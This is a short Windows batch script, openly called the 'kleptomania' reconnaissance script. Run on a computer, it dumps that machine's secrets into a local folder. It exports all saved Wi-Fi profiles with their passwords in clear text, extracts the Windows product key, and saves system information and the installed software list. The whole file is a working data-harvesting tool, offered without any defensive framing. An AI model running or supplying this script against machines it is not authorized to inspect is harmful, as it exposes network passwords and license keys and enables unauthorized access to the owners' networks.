@echo off

:: Version 1.1.0 of the "kleptomania" reconnaissance script.
::
:: This script will export a wide array of system and network information
:: to a folder created in the same directory as this script.

:: Getting Started.
echo Kleptomania - v1.1.0
echo.
mkdir .\kleptomania\%COMPUTERNAME%

:: Export all installed wlan profiles in xml format.
echo Exporting wlan profiles...
mkdir .\kleptomania\%COMPUTERNAME%\wifi_profiles
netsh wlan export profile key=clear folder=.\kleptomania\%COMPUTERNAME%\wifi_profiles > nul

:: Dump Windows license.
echo Exporting Windows version information and license key...
wmic path softwarelicensingservice get OA3xOriginalProductKey > .\kleptomania\%COMPUTERNAME%\windows_license.txt

:: Dump basic system information.
echo Exporting system information...
systeminfo > .\kleptomania\%COMPUTERNAME%\system_dump.txt

:: Dump installed software.
echo Exporting installed software information...
wmic product get Name,Version,InstallDate,Vendor > .\kleptomania\%COMPUTERNAME%\software_dump.txt

:: Done.
echo.
echo Export completed.
pause